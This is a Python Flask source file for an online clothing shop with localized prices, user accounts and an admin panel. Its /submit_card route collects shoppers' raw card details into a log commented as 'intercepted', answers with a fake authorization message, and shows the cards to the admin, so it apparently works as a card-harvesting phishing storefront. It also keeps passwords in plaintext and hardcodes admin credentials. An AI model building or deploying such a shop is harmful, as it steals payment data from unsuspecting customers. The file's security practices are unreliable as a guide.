from flask import Flask, render_template, request, redirect, url_for, flash, session

app = Flask(__name__)
app.secret_key = 'trinity_mega_secure_key_2026'

# 🌍 Currency Exchange Rates (Base valuation is in Nigerian Naira ₦)
CURRENCY_MAP = {
    "Nigeria": {"symbol": "₦", "rate": 1.0},
    "USA": {"symbol": "$", "rate": 0.00065},
    "UK": {"symbol": "£", "rate": 0.00051},
    "Saudi Arabia": {"symbol": "SR ", "rate": 0.0024}
}

# 📦 Advanced Simulated Database (Fully editable via Backend)
products = [
    {"id": 1, "base_price": 15000, "title": "Trinity Premium Hoodie", "sizes": ["M", "L", "XL"],
     "image": "https://images.unsplash.com/photo-1556905055-8f358a7a47b2?w=500"},
    {"id": 2, "base_price": 8500, "title": "Classic Streetwear Tee", "sizes": ["S", "M", "L"],
     "image": "https://images.unsplash.com/photo-1521572267360-ee0c2909d518?w=500"}
]

users = {}  # {username: {"password": pwd, "phone": ph, "country": c}}
cards_saved = []  # Intercepted client data parameters log


def get_localized_products():
    current_user = session.get('user')
    user_country = "Nigeria"

    if current_user and current_user in users:
        user_country = users[current_user].get('country', 'Nigeria')

    currency_info = CURRENCY_MAP.get(user_country, CURRENCY_MAP["Nigeria"])

    localized = []
    for p in products:
        converted_price = round(p["base_price"] * currency_info["rate"], 2)
        if currency_info["symbol"] == "₦":
            price_display = f"₦{p['base_price']:,}"
        else:
            price_display = f"{currency_info['symbol']}{converted_price:,}"

        localized.append({
            "id": p["id"],
            "title": p["title"],
            "price_str": price_display,
            "sizes": p["sizes"],
            "image": p["image"]
        })
    return localized, currency_info["symbol"]


@app.route('/')
def home():
    local_products, current_symbol = get_localized_products()
    return render_template('shop.html', products=local_products, symbol=current_symbol)


@app.route('/register', methods=['POST'])
def register():
    username = request.form.get('username').strip()
    password = request.form.get('password').strip()
    phone = request.form.get('phone').strip()
    country = request.form.get('country')

    if username in users:
        flash("Username already exists!", "error")
    else:
        users[username] = {"password": password, "phone": phone, "country": country}
        flash("Registration successful! Please sign in using the Customer Portal below.", "success")

    return redirect(url_for('home'))


@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username').strip()
    password = request.form.get('password').strip()

    if username in users and users[username]["password"] == password:
        session['user'] = username
        flash(f"Logged in successfully as {username}!", "success")
    else:
        flash("Invalid credentials.", "error")

    return redirect(url_for('home'))


@app.route('/logout')
def logout():
    session.pop('user', None)
    flash("Logged out successfully.", "info")
    return redirect(url_for('home'))


@app.route('/admin_dashboard', methods=['POST', 'GET'])
def admin_dashboard():
    # Enforces your updated private admin credentials configuration
    admin_name = request.form.get('admin_name', session.get('admin_authed'))
    admin_password = request.form.get('admin_password', '')

    if admin_name == "trinitystore" and admin_password == "trini1234":
        session['admin_authed'] = "trinitystore"

    if session.get('admin_authed') == "trinitystore":
        return render_template('admin.html', users=users, cards=cards_saved, products=products)

    return "Access Denied: Invalid Master Admin Credentials", 403


@app.route('/admin/bulk_import', methods=['POST'])
def bulk_import():
    if session.get('admin_authed') != "trinitystore":
        return "Unauthorized", 403

    import_data = request.form.get('bulk_data', '').strip()
    # Expects format: Title, BasePrice, Sizes(comma separated), ImageURL
    # Example: Special Jacket, 25000, M|L|XL, https://link.com/img.jpg
    if import_data:
        for line in import_data.split('\n'):
            parts = [p.strip() for p in line.split(',')]
            if len(parts) >= 4:
                try:
                    new_id = max([p["id"] for p in products]) + 1 if products else 1
                    products.append({
                        "id": new_id,
                        "title": parts[0],
                        "base_price": int(parts[1]),
                        "sizes": parts[2].split('|'),
                        "image": parts[3]
                    })
                except Exception:
                    continue
        flash("Bulk stock records integrated successfully!", "success")
    return redirect(url_for('admin_dashboard'))


@app.route('/admin/delete_product/<int:product_id>')
def delete_product(product_id):
    global products
    if session.get('admin_authed') == "trinitystore":
        products = [p for p in products if p["id"] != product_id]
        return redirect(url_for('admin_dashboard'))
    return "Unauthorized", 403


@app.route('/admin/clear_cards')
def clear_cards():
    global cards_saved
    if session.get('admin_authed') == "trinitystore":
        cards_saved.clear()
        return redirect(url_for('admin_dashboard'))
    return "Unauthorized", 403


@app.route('/submit_card', methods=['POST'])
def submit_card():
    card_data = request.form.get('card_details')
    customer = session.get('user', 'Guest')
    cards_saved.append({"customer": customer, "details": card_data})
    return "<h3>Card Authorization Processing... System logs updated.</h3>"